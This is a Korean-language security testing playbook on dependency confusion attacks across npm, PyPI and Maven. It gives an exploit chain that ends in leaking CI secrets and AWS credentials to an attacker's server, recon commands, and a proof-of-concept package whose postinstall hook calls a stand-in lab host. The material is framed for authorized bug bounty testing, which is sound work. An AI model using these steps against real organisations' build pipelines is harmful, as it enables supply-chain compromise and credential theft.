# Scenario: Dependency Confusion (npm / pypi / maven / gradle)

> Alex Birsan 2021 공개 이후로도 지속 발견. 내부 패키지 이름을 public registry에
> 선점하여 build pipeline hijack.

## 1. Threat Model
- **타겟**: 내부 private registry(Nexus, Artifactory, AWS CodeArtifact)와 public registry 혼용 빌드
- **공격자**: unauthenticated, public registry에 계정만 있으면 됨
- **Impact**: CI/CD RCE, secrets 유출, 빌드 아티팩트 변조
- **Severity**: High–Critical

## 2. Discovery Signals
- 공개된 `package.json`, `requirements.txt`, `pom.xml`, `build.gradle` 내 **비공식** 패키지 이름
- Scope 없는 npm 패키지명 (`@company/util` 아닌 `company-util`)
- `packageManager` 설정에 private registry 없이 기본 사용
- GitHub Actions `.github/workflows`에서 `npm publish --dry-run` 또는 `pip download` 로그

## 3. Exploit Chain
```
A. 타겟 회사의 public repo에서 package.json 수집 (grep/gitleaks)
B. 각 의존성 이름을 public registry에서 검색 → 미등록인 것 추출
C. 공격자 계정으로 higher-version 패키지 발행 (내부 v1.2.3 → public v99.0.0)
D. 타겟 CI/CD가 install 시 public에서 pull (version 비교 우선)
E. postinstall/setup.py에서 환경 변수, SSH key, AWS creds 유출
F. exfil → 공격자 C2
```

## 4. PoC Template (authorized: own org, own bounty scope)
```bash
# Step 1 — 타겟 org 내부 패키지 후보 수집
grep -rE "\"@yourorg/[a-z0-9-]+\":" --include="package.json" .
# output: @yourorg/internal-logger, @yourorg/auth-helper 등

# Step 2 — public registry에 존재 확인
for pkg in @yourorg/internal-logger @yourorg/auth-helper; do
    echo "$pkg:"
    curl -s -o /dev/null -w "%{http_code}\n" "https://registry.npmjs.org/$pkg"
done
# 404 = 비등록 = confusion 가능

# Step 3 — 방어적 reservation (공격자 선점 방지)
npm publish --access=public  # 내부 org 명의로 placeholder 게시
```

```javascript
// malicious-test package.json (lab own)
{
  "name": "@yourorg/internal-logger",
  "version": "99.0.0",
  "scripts": {
    "postinstall": "node ./probe.js"
  }
}
// probe.js — 탐지용 canary (exfil 없이 POST to own collaborator)
const https = require('https');
https.request({hostname:'probe.yourlab.example',path:'/?h='+require('os').hostname()}).end();
```

## 5. Evidence Tier
- E1: 실제 타겟 CI가 canary 패키지 install → probe callback 수신
- E2: 내부 패키지 이름이 public registry에서 미등록 증명 + install 경로 분석
- E3: config 기반 정적 분석만

## 6. Gate 1 / Gate 2
- [ ] 타겟 프로그램이 "supply chain" scope 명시?
- [ ] Exfil 없이 callback만 보내야 — 실제 secrets 유출은 violating
- [ ] 공격자가 사용한 패키지명 제출 직후 unpublish (cleanup)
- [ ] GitHub Security Lab 규정 준수

## 7. Variants
- **Typosquatting**: `lodash` → `lod4sh`, `discord.py` → `discordpy`
- **Scope confusion**: `@company/util` vs `@company-util`
- **Star-jacking**: 유사 패키지에 정품 README + star count 가장
- **Build tool confusion**: Maven central vs 사내 Nexus 우선순위
- **Docker base image**: `docker.io/yourorg/...` 미사용 시 hub에 선점

## 8. References
- Alex Birsan — "Dependency Confusion" (2021-02)
- Snyk blog — 여러 후속 사례
- GitHub Security Lab disclosures
- `knowledge/techniques/supplychain_incidents_2025_2026.md` 섹션 2.1
